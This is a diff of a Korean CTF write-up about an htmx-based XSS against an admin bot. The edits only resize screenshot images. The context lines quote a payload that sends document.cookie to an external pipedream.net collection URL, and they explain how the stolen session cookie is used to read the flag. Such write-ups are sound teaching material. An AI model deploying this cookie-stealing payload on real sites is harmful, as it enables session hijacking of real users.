@@ -150,7 +150,7 @@ async fn take_report(Form(report): Form<Report>) -> Result<String, (StatusCode, 
      
 `hx-get`을 통해 GET 요청을 날리고 받은 결과 값이 인접한 `<div>` 태그에 반영되는지 확인해보았다.
      
-<img src="images/1.PNG" width="500px">
+<img src="images/1.PNG" width="700px">
      
 `<div id="content">` 안에 결과 값이 잘 들어가는 것이 확인되었다. 다음으로, `hx-get` 속성 값에 `<div hx-get="fetch('https://enbjsc6lizc3g.x.pipedream.net/?d='+document.cookie)" hx-trigger="load delay:1s" hx-target="closest div"></div><div></div>`를 넣어 실행해봤지만 요청이 수행되지 않았다.     
      
@@ -167,15 +167,15 @@ This event is triggered after an AJAX request has finished either in the case of
 
 거의 다 왔는데 `hx-get` 요청 이후 `htmx:afterRequest`가 수행되며 쿠키 값을 전달한다. 즉, 위 내용을 Note의 입력 값으로 전달하고 Report를 통해 adminbot이 읽게 하면 아래와 같이 세션을 탈취할 수 있게 된다. 
      
-<img src="images/2.PNG" width="500px">     
+<img src="images/2.PNG" width="700px">     
 
 얻은 세션 값을 쿠키에 넣어주고 `/note/flag`에 접근해주면 된다. 
            
-<img src="images/3.PNG" width="500px">        
+<img src="images/3.PNG" width="700px">        
        
 `/note/flag`에 접근해주면 FLAG 값이 잘 보이는 것을 확인할 수 있다.    
       
-<img src="images/4.PNG" width="500px">
+<img src="images/4.PNG" width="700px">
 
 
 
